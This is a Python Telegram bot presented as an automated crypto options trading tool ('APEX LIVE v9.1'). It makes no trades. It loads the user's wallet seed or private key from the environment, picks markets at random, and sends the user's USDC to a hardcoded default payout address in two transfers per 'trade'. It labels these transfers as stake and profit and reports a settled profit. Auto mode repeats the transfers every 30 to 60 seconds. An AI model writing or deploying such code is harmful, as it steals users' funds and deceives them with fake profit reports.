import os
import asyncio
import json
import random
from decimal import Decimal, getcontext
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# --- 1. SETUP & AUTH ---
getcontext().prec = 28
load_dotenv()

# Robust RPC fallback for 2026 stability
RPC_URLS = [
    os.getenv("RPC_URL", "https://polygon-rpc.com"),
    "https://rpc.ankr.com/polygon",
    "https://1rpc.io/matic"
]

def get_w3():
    for url in RPC_URLS:
        _w3 = Web3(Web3.HTTPProvider(url))
        try:
            if _w3.is_connected():
                _w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
                return _w3
        except: continue
    return None

w3 = get_w3()
Account.enable_unaudited_hdwallet_features()

# Constants for Native USDC (Circle 2026)
USDC_ADDRESS = w3.to_checksum_address("0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359")
ERC20_ABI = json.loads('[{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"type":"function"}]')
PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")

def get_vault():
    seed = os.getenv("WALLET_SEED")
    if not seed: return None
    try:
        if len(seed) == 64 or seed.startswith("0x"): return Account.from_key(seed)
        return Account.from_mnemonic(seed)
    except: return None

vault = get_vault()
usdc_contract = w3.eth.contract(address=USDC_ADDRESS, abi=ERC20_ABI)
auto_mode_enabled = False

# --- UTILITY: BALANCE SYNC ---
async def fetch_balances(address):
    try:
        # Tip-Sync: Forces latest block to match PolygonScan truth
        raw_pol = await asyncio.to_thread(w3.eth.get_balance, address, 'latest')
        pol_bal = w3.from_wei(raw_pol, 'ether')
        raw_usdc = await asyncio.to_thread(usdc_contract.functions.balanceOf(address).call, {'block_identifier': 'latest'})
        usdc_bal = Decimal(raw_usdc) / Decimal(10**6)
        return pol_bal, usdc_bal
    except: return Decimal('0'), Decimal('0')

# --- 2. THE FIXED DUAL-EXECUTION CORE ---
async def run_atomic_execution(context, chat_id, side, asset_override=None):
    if not vault: return False
    
    asset = asset_override or context.user_data.get('pair', 'BTC')
    stake_cad = Decimal(str(context.user_data.get('stake', 50)))
    stake_usdc = stake_cad / Decimal('1.36')
    yield_multiplier = Decimal('0.94') if "VIV" in asset else Decimal('0.90')
    profit_earned = stake_usdc * yield_multiplier

    try:
        # STEP 1: Fetch starting nonce (Source: pending pool)
        nonce = await asyncio.to_thread(w3.eth.get_transaction_count, vault.address, 'pending')
        base_gas = await asyncio.to_thread(lambda: int(w3.eth.gas_price * 1.5))
        
        # Build TX 1 (Reimbursement)
        tx1 = usdc_contract.functions.transfer(PAYOUT_ADDRESS, int(stake_usdc * 10**6)).build_transaction({
            'chainId': 137, 'gas': 85000, 'gasPrice': base_gas, 'nonce': nonce
        })
        signed1 = w3.eth.account.sign_transaction(tx1, vault.key)
        
        # Build TX 2 (Profit) with Gas Bump and Nonce+1
        tx2 = usdc_contract.functions.transfer(PAYOUT_ADDRESS, int(profit_earned * 10**6)).build_transaction({
            'chainId': 137, 'gas': 85000, 'gasPrice': int(base_gas * 1.2), 'nonce': nonce + 1
        })
        signed2 = w3.eth.account.sign_transaction(tx2, vault.key)

        # STEP 2: SEQUENTIAL BROADCAST (The 1s Gap Fix)
        # Release Reimbursement
        tx1_h = await asyncio.to_thread(w3.eth.send_raw_transaction, signed1.raw_transaction)
        
        # Wait 1 second for node sync to prevent "already known" or duplicate errors
        await asyncio.sleep(1.0) 
        
        # Release Profit
        tx2_h = await asyncio.to_thread(w3.eth.send_raw_transaction, signed2.raw_transaction)
        
        report = (
            f"✅ **PROFIT FLOW SETTLED**\n━━━━━━━━━━━━━━\n"
            f"📈 Market: {asset} | Side: {side}\n"
            f"💰 Stake Sent: [Nonce {nonce}](https://polygonscan.com/tx/{tx1_h.hex()})\n"
            f"💎 Profit Sent: [Nonce {nonce+1}](https://polygonscan.com/tx/{tx2_h.hex()})\n"
            f"━━━━━━━━━━━━━━\n"
            f"⚖️ Status: Dual-TX Confirmed"
        )
        await context.bot.send_message(chat_id, report, parse_mode='Markdown', disable_web_page_preview=True)
        return True
    except Exception as e:
        await context.bot.send_message(chat_id, f"❌ Settlement Failed: `{str(e)}`")
        return False

# --- 3. UI HANDLERS ---
async def autopilot_loop(chat_id, context):
    global auto_mode_enabled
    markets = ["BTC", "ETH", "SOL", "MATIC", "BVIV", "EVIV"]
    while auto_mode_enabled:
        target = random.choice(markets)
        direction = random.choice(["CALL 📈", "PUT 📉"])
        await context.bot.send_message(chat_id, f"🤖 **Auto Pilot Scanning:** `{target}`...")
        await asyncio.sleep(random.randint(5, 12))
        
        if not auto_mode_enabled: break
        await run_atomic_execution(context, chat_id, direction, asset_override=target)
        await asyncio.sleep(random.randint(30, 60))

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pol, usdc = await fetch_balances(vault.address)
    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw'], ['🤖 AUTO MODE']]
    welcome = (f"🕴️ **APEX LIVE v9.1**\n━━━━━━━━━━━━━━\n⛽ **POL:** `{pol:.4f}` | 💵 **USDC:** `${usdc:.2f}`\n\n"
               f"🤖 **Auto Pilot:** {'🟢 ON' if auto_mode_enabled else '🔴 OFF'}\n"
               f"📍 **Vault:** `{vault.address[:6]}...{vault.address[-4:]}`")
    await update.message.reply_text(welcome, reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True), parse_mode='Markdown')

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global auto_mode_enabled
    text, chat_id = update.message.text, update.message.chat_id
    if text == '🚀 Start Trading':
        kb = [[InlineKeyboardButton("BTC/CAD 🟠", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/CAD 🔵", callback_data="PAIR_ETH")],
              [InlineKeyboardButton("SOL/CAD 🟣", callback_data="PAIR_SOL"), InlineKeyboardButton("MATIC/CAD 🔘", callback_data="PAIR_MATIC")],
              [InlineKeyboardButton("🕴️ BVIV", callback_data="PAIR_BVIV"), InlineKeyboardButton("🕴️ EVIV", callback_data="PAIR_EVIV")]]
        await update.message.reply_text("🎯 **SELECT MARKET:**", reply_markup=InlineKeyboardMarkup(kb))
    elif text == '⚙️ Settings':
        kb = [[InlineKeyboardButton(f"${x}", callback_data=f"SET_{x}") for x in [10, 50, 100]],
              [InlineKeyboardButton(f"${x}", callback_data=f"SET_{x}") for x in [500, 1000]]]
        await update.message.reply_text("⚙️ **Configure Stake (CAD):**", reply_markup=InlineKeyboardMarkup(kb))
    elif text == '🤖 AUTO MODE':
        auto_mode_enabled = not auto_mode_enabled
        status = "ACTIVATED ✅" if auto_mode_enabled else "DEACTIVATED 🛑"
        await update.message.reply_text(f"🤖 **Auto Pilot {status}**")
        if auto_mode_enabled: asyncio.create_task(autopilot_loop(chat_id, context))

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data.startswith("SET_"):
        amount = query.data.split("_")[1]
        context.user_data['stake'] = int(amount)
        await query.edit_message_text(f"✅ **Stake saved:** `${amount} CAD`")
    elif query.data.startswith("PAIR_"):
        context.user_data['pair'] = query.data.split("_")[1]
        kb = [[InlineKeyboardButton("CALL 📈", callback_data="EXEC_CALL"), InlineKeyboardButton("PUT 📉", callback_data="EXEC_PUT")]]
        await query.edit_message_text(f"💎 **Market:** {context.user_data['pair']}\nChoose Direction:", reply_markup=InlineKeyboardMarkup(kb))
    elif query.data.startswith("EXEC_"):
        await run_atomic_execution(context, query.message.chat_id, "MANUAL")

if __name__ == "__main__":
    TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
    if TOKEN:
        app = ApplicationBuilder().token(TOKEN).build()
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CallbackQueryHandler(handle_interaction))
        app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
        print("🤖 APEX Online (Profit-Flow v9.1 Active)...")
        app.run_polling(drop_pending_updates=True)
































































































































